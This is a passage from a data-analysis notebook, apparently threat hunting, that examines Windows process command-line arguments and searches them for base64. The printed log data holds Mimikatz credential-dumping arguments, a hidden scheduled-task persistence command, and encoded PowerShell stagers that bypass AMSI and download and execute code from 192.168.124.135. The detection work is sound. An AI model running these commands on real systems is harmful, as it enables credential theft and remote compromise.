              "       'Files\\\\WindowsApps\\\\Microsoft.WindowsCalculator_10.1910.0.0_x64__8wekyb3d8bbwe\\\\Calculator.exe\" -ServerName:App.AppXsm3pg4n7er43kdh1qp4e79f1j7am68r8.mca',\n",
              "       '-k BcastDVRUserService -s BcastDVRUserService', '-ano',\n",
              "       '0xffffffff -ForceV1',\n",
              "       '-noninteractive -Sta -encodedCommand CgAgACAAIAAgACAAIAAgACAAIAAgACAAIABBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEMAbwByAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAFcAaQBuAGQAbwB3AHMALgBDAGwAaQBwAGIAbwBhAHIAZABdADoAOgBHAGUAdABUAGUAeAB0ACgAKQAgAC0AcgBlAHAAbABhAGMAZQAgACIAYAByACIALAAgACcAJwAgAC0AcwBwAGwAaQB0ACAAIgBgAG4AIgAgACAACgAgACAAIAAgACAAIAAgACAA -inputFormat xml -outputFormat xml',\n",
              "       '-secured -Embedding', '-k netsvcs -p -s wlidsvc',\n",
              "       '-k WerSvcGroup',\n",
              "       '-k LocalSystemNetworkRestricted -p -s WdiSystemHost',\n",
              "       'Files\\\\WindowsApps\\\\Microsoft.MicrosoftOfficeHub_18.2002.1101.0_x64__8wekyb3d8bbwe\\\\LocalBridge.exe\" /InvokerPRAID: Microsoft.MicrosoftOfficeHub notifications',\n",
              "       '-ServerName:Microsoft.MicrosoftOfficeHub.AppX54h2e8jwdm50fj5ha8987vz1etpx7czd.mca',\n",
              "       '-ServerName:App.AppXemn3t55segp7q92mwd35v2a5rk5mvwyz.mca',\n",
              "       '-k wsappx -p -s ClipSVC',\n",
              "       '/Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251}',\n",
              "       '-ServerName:Windows.Internal.WebRuntime.ContentProcessServer',\n",
              "       'SCODEF:9716 CREDAT:9730 APH:1000000000000006 JITHOST /prefetch:2',\n",
              "       '-ServerName:MicrosoftEdge.AppXdnhjhccw3zf0j06tkg3jtqr00qdm0khc.mca',\n",
              "       'privilege::debug sekurlsa::logonpasswords exit',\n",
              "       '/Create /F /RU system /SC DAILY /ST 09:00 /TN Updater /TR \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NonI -W hidden -c \\\\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\\\\Software\\\\Microsoft\\\\Network debug).debug)))\\\\\"\"',\n",
              "       '-k LocalServiceNetworkRestricted -p -s NgcCtnrSvc',\n",
              "       '-k LocalSystemNetworkRestricted -p -s NgcSvc',\n",
              "       '-RegisterDevice -ProtectionStateChanged -FreeNetworkOnly',\n",
              "       '-NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAFIAcwBJAE8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAcwBTAEUAbQBCAEwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AGUAKAAkAG4AVQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBsAD0AWwBDAG8AbABsAGUAQwB0AGkAbwBuAHMALgBHAGUATgBFAFIASQBjAC4ARABJAGMAVABJAE8AbgBhAHIAWQBbAFMAVABSAGkAbgBnACwAUwB5AFMAVABFAG0ALgBPAEIAagBlAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAdgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEATAB9AEUATABTAEUAewBbAFMAQwBSAEkAcAB0AEIATABvAEMAawBdAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAVQBlACgAJABOAFUATABMACwAKABOAEUAVwAtAE8AQgBqAGUAQwBUACAAQwBvAGwAbABFAEMAVABpAE8AbgBTAC4ARwBlAG4AZQBSAEkAQwAuAEgAQQBzAEgAUwBFAHQAWwBzAHQAUgBJAE4AZwBdACkAKQB9AFsAUgBlAEYAXQAuAEEAUwBTAEUAbQBiAGwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEAbAB1AEUAKAAkAE4AVQBsAEwALAAkAFQAcgBVAGUAKQB9ADsAfQA7AFsAUwBZAFMAdABlAG0ALgBOAEUAVAAuAFMAZQBSAFYASQBjAEUAUABvAGkAbgB0AE0AYQBOAEEAZwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAE4AVABpAE4AdQBlAD0AMAA7ACQAdwBjAD0ATgBFAFcALQBPAGIASgBlAGMAVAAgAFMAeQBTAFQAZQBtAC4ATgBlAFQALgBXAGUAYgBDAGwAaQBlAG4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBhAGQARQBSAHMALgBBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQA9AFsAUwB5AHMAVABlAG0ALgBOAEUAdAAuAFcARQBiAFIAZQBRAHUARQBzAFQAXQA6ADoARABlAGYAQQB1AGwAdABXAEUAQgBQAFIATwB4AHkAOwAkAFcAYwAuAFAAUgBvAFgAeQAuAEMAUgBlAGQAZQBOAFQASQBBAEwAcwAgAD0AIABbAFMAeQBzAFQARQBtAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAGkAQQBMAEMAQQBDAGgAZQBdADoAOgBEAGUAZgBhAHUATABUAE4ARQBUAHcATwBSAEsAQwByAEUAZABFAE4AdABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAE0ALgBUAEUAWABUAC4ARQBOAGMAbwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAHcAQwAuAEgAZQBhAGQAZQBSAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AFMATQBMAFgAVwBRAGIAaQBFADMAWgAvAE4ARABHAHEATAB1ADgAVAA5AEUAdABCAHIARABRAD0AIgApADsAJABEAEEAdABhAD0AJABXAEMALgBEAE8AVwBuAGwAbwBBAEQARABhAFQAQQAoACQAUwBFAHIAKwAkAHQAKQA7ACQASQBWAD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABBAD0AJABkAEEAdABBAFsANAAuAC4AJABkAEEAVABhAC4AbABFAE4AZwB0AEgAXQA7AC0AagBvAGkAbgBbAEMAaABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=',\n",
              "       '-NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x',\n",
              "       '10512 324 000001E6D2E90490', '/groups',\n",
              "       '-noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAUwBpAE8ATgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBJAG8ATgAuAE0AQQBqAG8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAEUATQBiAEwAeQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAGEATABVAGUAKAAkAG4AVQBMAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8ATABMAGUAQwB0AGkAbwBOAHMALgBHAGUAbgBlAFIASQBDAC4ARABJAEMAVABpAG8AbgBhAHIAWQBbAFMAVAByAGkAbgBnACwAUwB5AFMAVABlAE0ALgBPAGIASgBlAEMAVABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAVgBhAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABzAEUAewBbAFMAYwByAGkAUAB0AEIATABPAGMASwBdAC4AIgBHAGUAdABGAGkARQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAdQBlACgAJABuAFUATABsACwAKABOAGUAVwAtAE8AYgBqAGUAYwBUACAAQwBvAEwAbABFAEMAdABpAE8AbgBzAC4ARwBlAG4AZQBSAEkAYwAuAEgAYQBTAGgAUwBlAHQAWwBzAHQAcgBpAE4ARwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBiAGwAWQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBMAEwALAAkAFQAUgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAVABFAG0ALgBOAEUAdAAuAFMAZQByAFYASQBjAEUAUABvAGkAbgB0AE0AQQBOAGEARwBFAFIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBvAE4AVABpAG4AdQBFAD0AMAA7ACQAdwBDAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAeQBzAFQARQBtAC4ATgBFAHQALgBXAEUAQgBDAGwASQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBBAGQAZQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAFgAWQA9AFsAUwBZAHMAVABFAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAHUAZQBzAFQAXQA6ADoARABlAGYAYQBVAGwAVABXAGUAQgBQAHIATwB4AFkAOwAkAHcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBuAFQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAEUATgB0AGkAYQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBBAFUAbABUAE4AZQBUAHcAbwByAEsAQwByAGUARABFAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABlAE0ALgBUAEUAeABUAC4ARQBuAEMAbwBkAGkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAeQB0AEUAcwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAQQBEAGUAcgBzAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBqAHMAagBkAG0AMABoAE4AagBIAHgAYgBaAEcASABrAGEAeQBpACsAcgBOAFkAYwBKAFYAcwA9ACIAKQA7ACQARABhAHQAQQA9ACQAVwBDAC4ARABvAFcATgBsAG8AQQBEAEQAYQBUAGEAKAAkAHMARQByACsAJABUACkAOwAkAGkAdgA9ACQAZABhAFQAQQBbADAALgAuADMAXQA7ACQARABBAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABBAHQAQQAuAEwARQBOAGcAVABoAF0AOwAtAEoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA',\n",
              "       '\"C:\\\\Users\\\\anon\\\\Downloads\\\\quarterly_results.docm.vbs\"',\n",
              "       '-IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe|C:\\\\Users\\\\anon\\\\Downloads\\\\quarterly_results.docm.vbs|http://192.168.124.135/quarterly_results.docm.vbs',\n",
              "       '-k appmodel -p -s camsvc'], dtype=object)"
            ]
          },
          "metadata": {},
          "execution_count": 62
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "dXSlQpx_ej92"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "3. base64?\n"
      ],
      "metadata": {
        "id": "qiiamfiLe9Ih"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import re\n",
        "b64_regex = r\"[a-zA-Z0-9+\\/]{64,}={0,2}\""
      ],
      "metadata": {
        "id": "TDIGUEz-epry"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['arguments'][newdf['arguments'].str.contains('enc')]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "m1TdXk1NfFGT",
        "outputId": "f80814b1-d337-4dcc-a5a7-63675bbd0435"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "873     -noninteractive -Sta -encodedCommand CgAgACAAI...\n",
              "2564    -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBF...\n",
              "2728    -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software...\n",
              "3351    -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAUw...\n",
              "Name: arguments, dtype: object"
            ]
          },
          "metadata": {},
          "execution_count": 64
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "for i in newdf['arguments'][newdf['arguments'].apply(lambda x: re.search(b64_regex, x)).notnull()]:\n",
        "    print(i,\"\\n\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "fO_ZslgGfPXv",
        "outputId": "8569cbd9-865e-424d-bdb1-bb122c5b63c8"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "-noninteractive -Sta -encodedCommand CgAgACAAIAAgACAAIAAgACAAIAAgACAAIABBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEMAbwByAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAFcAaQBuAGQAbwB3AHMALgBDAGwAaQBwAGIAbwBhAHIAZABdADoAOgBHAGUAdABUAGUAeAB0ACgAKQAgAC0AcgBlAHAAbABhAGMAZQAgACIAYAByACIALAAgACcAJwAgAC0AcwBwAGwAaQB0ACAAIgBgAG4AIgAgACAACgAgACAAIAAgACAAIAAgACAA -inputFormat xml -outputFormat xml \n",
            "\n",
            "-NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAFIAcwBJAE8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAcwBTAEUAbQBCAEwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AGUAKAAkAG4AVQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBsAD0AWwBDAG8AbABsAGUAQwB0AGkAbwBuAHMALgBHAGUATgBFAFIASQBjAC4ARABJAGMAVABJAE8AbgBhAHIAWQBbAFMAVABSAGkAbgBnACwAUwB5AFMAVABFAG0ALgBPAEIAagBlAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAdgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEATAB9AEUATABTAEUAewBbAFMAQwBSAEkAcAB0AEIATABvAEMAawBdAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAVQBlACgAJABOAFUATABMACwAKABOAEUAVwAtAE8AQgBqAGUAQwBUACAAQwBvAGwAbABFAEMAVABpAE8AbgBTAC4ARwBlAG4AZQBSAEkAQwAuAEgAQQBzAEgAUwBFAHQAWwBzAHQAUgBJAE4AZwBdACkAKQB9AFsAUgBlAEYAXQAuAEEAUwBTAEUAbQBiAGwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEAbAB1AEUAKAAkAE4AVQBsAEwALAAkAFQAcgBVAGUAKQB9ADsAfQA7AFsAUwBZAFMAdABlAG0ALgBOAEUAVAAuAFMAZQBSAFYASQBjAEUAUABvAGkAbgB0AE0AYQBOAEEAZwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAE4AVABpAE4AdQBlAD0AMAA7ACQAdwBjAD0ATgBFAFcALQBPAGIASgBlAGMAVAAgAFMAeQBTAFQAZQBtAC4ATgBlAFQALgBXAGUAYgBDAGwAaQBlAG4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBhAGQARQBSAHMALgBBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQA9AFsAUwB5AHMAVABlAG0ALgBOAEUAdAAuAFcARQBiAFIAZQBRAHUARQBzAFQAXQA6ADoARABlAGYAQQB1AGwAdABXAEUAQgBQAFIATwB4AHkAOwAkAFcAYwAuAFAAUgBvAFgAeQAuAEMAUgBlAGQAZQBOAFQASQBBAEwAcwAgAD0AIABbAFMAeQBzAFQARQBtAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAGkAQQBMAEMAQQBDAGgAZQBdADoAOgBEAGUAZgBhAHUATABUAE4ARQBUAHcATwBSAEsAQwByAEUAZABFAE4AdABpAEEATABTADsAJABTAGMAc